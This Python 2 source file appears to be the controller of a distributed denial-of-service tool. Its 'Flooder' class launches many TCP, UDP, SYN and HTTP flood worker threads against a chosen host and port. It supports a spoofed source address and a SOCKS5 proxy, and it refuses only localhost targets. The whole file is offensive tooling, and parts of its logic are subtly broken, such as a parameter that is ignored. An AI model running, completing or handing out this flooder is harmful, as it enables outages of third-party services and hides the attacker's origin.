from multiprocessing import Queue, Value
import socket
from Events import *
from Globals import *
from Functions import *
from UDPWorkerThread import UDPWorkerThread
from TCPWorkerThread import TCPWorkerThread
from HTTPWorkerThread import HTTPWorkerThread
try:
    import synmod
except ImportError:
    print "Couldn't load synmod, have you compiled it? (if you're on windows, ignore this message)"
else:
    from SYNWorkerThread import SYNWorkerThread

class Flooder:

    def __init__(self, host, port, timeout, method, threads, subsite, message, Random, wait, srchost, srcport, socks5ip, socks5port):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.method = method
        self.threadsAmount = threads
        self.__processes = []
        self.wait = wait
        self.subsite = subsite
        self.message = message
        self.random = random
        self.threadId = 0
        self.srchost = srchost
        self.srcport = srcport
        self.initsuccess = True
        self.socks5ip = socks5ip
        self.socks5port = socks5port
        self.byteCount = Value('i', 0)

        if socket.gethostbyname(host).split('.')[0] == '127':
            print "Is someone being funny again? I'm not going to DDoS myself"
            self.initsuccess = False

        try:
            if method.index(TCP_METHOD) != -1:
                if message == None and random == False:
                    print "Message missing, not using TCP method"
                    method.remove(TCP_METHOD)
        except:
            pass

        try:
            if method.index(UDP_METHOD) != -1:
                if message == None and random == False:
                    print "Message missing, not using UDP method"
                    method.remove(UDP_METHOD)
        except:
            pass

        try:
            if method.index(SYN_METHOD) != -1:
                ret = synmod.init(srchost, srcport, host, port)
                if ret != -1:
                    print "synmod init success"
                else:
                    method.remove(SYN_METHOD)
        except:
            if SYN_METHOD in method != -1:
                method.remove(SYN_METHOD)


        if len(method) == 0:
            print "No methods left to try, not starting."
            self.initsuccess = False
            

    def start(self):
        if len(self.__processes) > 0 or not self.initsuccess:
            return

        x = 0
        while len(self.__processes) < self.threadsAmount and x < 2*self.threadsAmount:
            p = None
            if self.method[x%len(self.method)] == TCP_METHOD:
	            p = TCPWorkerThread(self, self.threadId)
            elif self.method[x%len(self.method)] == UDP_METHOD:
	            p = UDPWorkerThread(self, self.threadId)
            elif self.method[x%len(self.method)] == SYN_METHOD:
	            p = SYNWorkerThread(self, self.threadId)
            elif self.method[x%len(self.method)] == HTTP_METHOD:
	            p = HTTPWorkerThread(self, self.threadId)

            x += 1

            if not p.running:
                continue

            self.threadId += 1
            self.__processes.append(p)
            p.start()

    def stop(self):
        while len(self.__processes) > 0:
            p = self.__processes.pop()
            p.stop()
            p.terminate() #This will leave some defunct threads, but they will be reaped upon starting automatically.

        print "final byteCount:", self.byteCount.value

    def processNumber(self):
        return len(self.__processes)

